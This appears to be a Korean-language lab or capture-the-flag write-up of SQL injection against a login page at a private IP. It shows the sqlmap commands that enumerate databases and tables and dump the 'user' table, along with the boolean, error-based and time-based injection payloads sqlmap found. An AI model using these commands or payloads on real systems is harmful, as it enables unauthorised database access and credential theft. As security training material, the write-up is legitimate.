![](https://velog.velcdn.com/images/agnusdei1207/post/15c1e488-585d-429e-bc9f-184f32f80aec/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/2e58ce89-0bf9-4b3c-b031-29ed56f3b787/image.png)

# 10.201.87.236

> sqlmap -u "http://10.201.87.236/ai/includes/user_login?email=test&password=test" --dbs -level=5

![](https://velog.velcdn.com/images/agnusdei1207/post/dc7b1897-4628-4510-bbf0-fffa34e3b8ec/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/b653bb35-7a0f-45ac-874d-1929a2321072/image.png)

---

[14:53:53] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:53:55] [INFO] fetching database names
[14:53:56] [INFO] retrieved: 'information_schema'
[14:53:56] [INFO] retrieved: 'ai'
[14:53:57] [INFO] retrieved: 'mysql'
[14:53:57] [INFO] retrieved: 'performance_schema'
[14:53:57] [INFO] retrieved: 'phpmyadmin'
[14:53:58] [INFO] retrieved: 'test'
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[14:53:58] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.201.87.236'

[*] ending @ 14:53:58 /2025-09-29/

> sqlmap -u "http://10.201.87.236/ai/includes/user_login?email=test&password=test" -D ai --tables -level=5

![](https://velog.velcdn.com/images/agnusdei1207/post/16c51903-03da-4434-808c-40ab61b73996/image.png)

┌──(root㉿docker-desktop)-[/]
└─# sqlmap -u "http://10.201.87.236/ai/includes/user_login?email=test&password=test" -D ai --tables -level=5
**\_
**H**
\_** **\_[)]\_\_\_** **\_ \_** {1.9.9#stable}
|\_ -| . [)] | .'| . |
|**_|_ ["]_|_|\_|**,| _|
|_|V... |\_| https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:59:33 /2025-09-29/

[14:59:33] [INFO] resuming back-end DBMS 'mysql'
[14:59:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

---

Parameter: email (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
Payload: email=test' AND 1946=(SELECT (CASE WHEN (1946=1946) THEN 1946 ELSE (SELECT 7194 UNION SELECT 7039) END))-- CHFq&password=test

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: email=test' OR (SELECT 1957 FROM(SELECT COUNT(*),CONCAT(0x7170787a71,(SELECT (ELT(1957=1957,1))),0x716b787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IXoS&password=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 6412 FROM (SELECT(SLEEP(5)))qPOn)-- Actn&password=test

---

[14:59:34] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[14:59:34] [INFO] fetching tables for database: 'ai'
[14:59:35] [INFO] retrieved: 'user'
Database: ai
[1 table]
+------+
| user |
+------+

[14:59:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.201.87.236'

[*] ending @ 14:59:35 /2025-09-29/

> sqlmap -u "http://10.201.87.236/ai/includes/user_login?email=test@chatai.com&password=test" -D ai -T user --dump --level=5

--dump 옵션은 해당 테이블의 모든 데이터를 덤프합니다.
--level=5는 탐지 레벨을 높여 더 많은 테스트를 수행합니다.
-D 타겟 데이터베이스명
-T 타겟 테이블명
